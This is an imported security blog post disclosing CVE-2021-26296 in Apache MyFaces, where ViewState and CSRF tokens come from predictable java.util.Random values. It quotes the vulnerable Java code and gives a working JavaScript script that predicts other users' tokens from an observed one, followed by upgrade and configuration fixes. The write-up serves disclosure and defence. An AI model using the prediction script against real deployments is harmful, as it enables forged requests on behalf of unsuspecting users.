---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-02-19_csrf-in-jsf-20-predicting-csrf-tokens-for-apache-myfaces.md
original_filename: 2021-02-19_csrf-in-jsf-20-predicting-csrf-tokens-for-apache-myfaces.md
title: 'CSRF In JSF 2.0: Predicting CSRF Tokens For Apache MyFaces'
category: documents
detected_topics:
- access-control
- xss
- command-injection
- path-traversal
- otp
- csrf
tags:
- imported
- documents
- access-control
- xss
- command-injection
- path-traversal
- otp
- csrf
language: en
raw_sha256: 31fa88ded799ec2abcbb30617a3e6b9ca4d23f30205ea65bda1b1e0e501ae398
text_sha256: 4e5512c5297bc834390813ca8a349b6c362e3c80472fb855c8f96ea5ebe08485
ingested_at: '2026-06-28T07:32:04Z'
sensitivity: unknown
redactions_applied: false
---

# CSRF In JSF 2.0: Predicting CSRF Tokens For Apache MyFaces

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-02-19_csrf-in-jsf-20-predicting-csrf-tokens-for-apache-myfaces.md
- Source Type: markdown
- Detected Topics: access-control, xss, command-injection, path-traversal, otp, csrf
- Ingested At: 2026-06-28T07:32:04Z
- Redactions Applied: False
- Raw SHA256: `31fa88ded799ec2abcbb30617a3e6b9ca4d23f30205ea65bda1b1e0e501ae398`
- Text SHA256: `4e5512c5297bc834390813ca8a349b6c362e3c80472fb855c8f96ea5ebe08485`


## Content

---
title: "CSRF In JSF 2.0: Predicting CSRF Tokens For Apache MyFaces"
page_title: "CSRF in JSF 2.0: Predicting CSRF Tokens for Apache MyFaces – Certitude Blog"
url: "https://certitude.consulting/blog/en/csrf-myfaces-2/"
final_url: "https://certitude.consulting/blog/en/csrf-myfaces-2/"
authors: ["Wolfgang Ettlinger"]
programs: ["Apache"]
bugs: ["CSRF", "ViewState"]
publication_date: "2021-02-19"
added_date: "2022-12-09"
source: "pentester.land/writeups.json"
original_index: 3880
---

# CSRF in JSF 2.0: Predicting CSRF Tokens for Apache MyFaces

Written by [Wolfgang Ettlinger](https://certitude.consulting/blog/en/author/wet/) on [19.02.202118.05.2021](https://certitude.consulting/blog/en/csrf-myfaces-2/)

JavaServer Faces (JSF) is a commonly used server-side web framework. Developers appreciate its relative ease of use while security engineers appreciate its ready-made solutions for many common security issues (e.g. XSS, some authorization issues). When researching the susceptibility to CSRF attacks, one might find many sources that suggest that CSRF is not an issue with modern JSF frameworks like Apache MyFaces. This is due to the ViewState parameter being required for state-changing requests. This parameter is long and unique, thus appearing to be a great CSRF token. The ViewState parameter, however, was not originally intended to for this purpose. Therefore, we dug a bit deeper to find out whether this is sufficient to protect against CSRF and, to our own surprise, we found out that in Apache MyFaces by default it was not!

## ViewStates

For those unfamiliar with the inner workings of JSF, here’s a quick overview of ViewStates: Whenever a user accesses a JSF page, a ViewState object containing information about the page is created. This allows the server to retain information across requests. Unlike a session, the ViewState is bound to a page. Therefore, it is e.g. possible to open an application in multiple browser tabs. With each tab having a unique ViewState, the server can keep track of a user’s interactions in multiple tabs.

JSF defines two approaches how ViewStates are persisted:

  * It is possible to serialize the state into a hidden field (client-side saving). With every interaction, the serialized state is sent to the server, possibly updated, and returned to the client.
  * The other approach (server-side saving) is to store the state on the server and only transmit a reference (i.e. a long unique id) in hidden fields.

## Server-Side State Saving

On the surface, the ViewState token Apache MyFaces generates for server-side saving fulfills most of the requirements of a CSRF token. However, a review of the relevant code showed that, by default, the unique token was generated in a predictable way (see [here](https://github.com/apache/myfaces/blob/myfaces-core-module-2.3.7/impl/src/main/java/org/apache/myfaces/application/viewstate/RandomKeyFactory.java#L70)):
  
  
  public RandomKeyFactory(FacesContext facesContext)
  {
  [...]
  random = new Random(((int) System.nanoTime()) + this.hashCode());
  }
  
  [...]
  
  @Override
  public byte[] generateKey(FacesContext facesContext)
  {
  byte[] array = new byte[length];
  byte[] key = new byte[length + 4];
  //sessionIdGenerator.getRandomBytes(array);
  random.nextBytes(array);
  for (int i = 0; i < array.length; i++)
  {
  key[i] = array[i];
  }
  int value = generateCounterKey(facesContext);
  key[array.length] = (byte) (value >>> 24);
  key[array.length + 1] = (byte) (value >>> 16);
  key[array.length + 2] = (byte) (value >>> 8);
  key[array.length + 3] = (byte) (value);
  return key;
  }

The unique id consists of a randomly generated string as well as a sequential per-session counter. The counter value can easily be guessed, as the counter is initialized with 1. Therefore, trying all counter values e.g. between 1 and 100 will very likely yields the correct value.

Guessing the random part is a bit trickier. MyFaces (by default) used `java.util.Random` to generate these values. This class implements a linear congruential random number generator. Unlike cryptographically secure random number generators, such a generator allows predicting future random values by observing previously generated values. It was therefore possible for an attacker to obtain a valid ViewState string from an application and predict the ViewState values generated for other users.

The following script demonstrates how to predict ViewState values for an unpatched Apache MyFaces installation in the default configuration:
  
  
  const multiplier = 0x5DEECE66Dn;
  const addend = 0xBn;
  const mask = (1n << 48n) - 1n;
  
  const unbyte = (bytes, offset) => BigInt(
  Array.from(bytes.slice(offset, offset + 4))
  .map((b, i) => b << (8 * i))
  .reduce((a, b) => a + b));
  
  const longify = n => integer(n, 8n);
  const intify = n => integer(n, 4n);
  const byteify = n => integer(n, 1n);
  
  function integer(n, len) {
  const bits = len * 8n;
  const hspan = 1n << (bits - 1n);
  return ((n + hspan) % (2n * hspan)) - hspan;
  }
  
  const hexToByteArray = s => (new Uint8Array(s.length / 2)
  .map((_, i) => (
  parseInt(s.charAt(2 * i), 16) << 4 |
  parseInt(s.charAt(2 * i + 1), 16))));
  
  const byteArrayToHex = b => (Array.from(b)
  .map(x => (((x + 0x100).toString(16)).substr(-2)))
  .reduce((a, b) => a + b))
  .toUpperCase();
  
  // based on https://github.com/fta2012/ReplicatedRandom/blob/master/ReplicatedRandom.java
  function replicatedRandom(bytes) {
  let seed = 0;
  
  replicateState(
  unbyte(bytes, bytes.length - 8), 32n,
  unbyte(bytes, bytes.length - 4), 32n);
  
  return nextBytes(bytes.length);
  
  function replicateState(nextN, n, nextM, m) {
  const upperMOf48Mask = ((1n << m) - 1n) << (48n - m);
  const oldSeedUpperN = (nextN << (48n - n)) & mask;
  const newSeedUpperM = (nextM << (48n - m)) & mask;
  
  let possibilityCount = 0;
  
  for (let oldSeed = oldSeedUpperN;
  oldSeed <= (oldSeedUpperN | ((1n << (48n - n)) - 1n));
  oldSeed++) {
  const newSeed = longify(
  longify(oldSeed * multiplier + addend) & mask);
  
  if ((newSeed & upperMOf48Mask) == newSeedUpperM) {
  possibilityCount++;
  seed = newSeed;
  }
  }
  
  if (possibilityCount != 1) throw new Error('replicateState failed');
  }
  
  function next(bits) {
  seed = longify(longify(seed * multiplier + addend) & mask);
  return intify(seed >> (48n - bits));
  }
  
  function nextBytes(count) {
  const res = new Int8Array(count);
  
  for (let i = 0; i < count; ) {
  let rnd = next(32n);
  for (let n = Math.min(count - i, 4); n > 0; n--) {
  res[i++] = parseInt(byteify(rnd));
  rnd >>= 8n;
  }
  }
  
  return res;
  }
  }

Interestingly, later we found that [Oracle’s own JSF implementation was vulnerable to CSRF](https://blog.securityevaluators.com/cracking-javas-rng-for-csrf-ea9cacd231d2) using a very similar attack.

## Client-Side State Saving

When configured for client-side state saving, Apache MyFaces by default encrypts and MACs the serialized ViewState to prevent an attacker from obtaining or modifying the cleartext state. However, ViewStates are not bound to a user’s session. Therefore, it is possible to obtain a ViewState from one session and send it back to the application in another session. As that’s exactly what’s needed for CSRF, client-side state saving by default does not prevent attacks. This is a well-known weakness of the client-site state saving mechanism (e.g. see [here](https://stackoverflow.com/questions/30373089/reusing-viewstate-value-in-other-session-csrf) or [here](https://arjan-tijms.omnifaces.org/p/jsf-22.html#869)).

Applications that utilize client-side state saving could use the protected-pages features of JSF. Pages that are marked as protected require a CSRF-Token (javax.faces.Token) with every request. However, Apache MyFaces used to use `java.util.Random` by default to generate these tokens, thus also allowing for CSRF attacks (see [here](https://github.com/apache/myfaces/blob/myfaces-core-module-2.3.7/impl/src/main/java/org/apache/myfaces/application/viewstate/RandomCsrfSessionTokenFactory.java#L74)):
  
  
  public RandomCsrfSessionTokenFactory(FacesContext facesContext)
  {
  [...]
  random = new Random(((int) System.nanoTime()) + this.hashCode());
  }
  
  [...]
  
  public byte[] generateKey(FacesContext facesContext)
  {
  byte[] array = new byte[length];
  random.nextBytes(array);
  return array;
  }
  

## Mitigation

Certitude has reported the issue to the Apache security team in December (see our [advisory](https://certitude.consulting/advisories/CSA_2021_001_Cross_Site_Request_Forgery_in_Apache_MyFaces.md.txt) for more details). The Apache MyFaces team has since released a new versions of Apache MyFaces that, by default, use cryptographically secure random number generators. Apache issued CVE-2021-26296 for this vulnerability. We would like to thank the Apache teams for their quick and professional response to our vulnerability report. 

Certitude recommends affected organizations to immediately upgrade to version 2.2.14, 2.3.8, 2.3-next-M5 or 3.0.0. If an upgrade to the latest version is not possible, the Apache MyFaces maintainers recommend setting the following settings to “secureRandom”:

  * org.apache.myfaces.RANDOM_KEY_IN_VIEW_STATE_SESSION_TOKEN
  * org.apache.myfaces.RANDOM_KEY_IN_CSRF_SESSION_TOKEN
  * org.apache.myfaces.RANDOM_KEY_IN_WEBSOCKET_SESSION_TOKEN

Note that the patch also introduces changes in the way websocket channel tokens are generated. It is unclear whether this change fixes a vulnerability. Certitude therefore recommends applying the patch or workaround to all applications that use Apache MyFaces, even if CSRF attacks are of no concern.

## Conclusion

Our experience shows that many developers and even penetration testers believed that CSRF is no longer an issue with modern JSF frameworks. This vulnerability shows that one should not only rely on publicly available information, but challenge assumptions and dig deeper. A thorough source code review of applications or components by experienced application security experts can reveal such vulnerabilities and thus greatly improve application security.
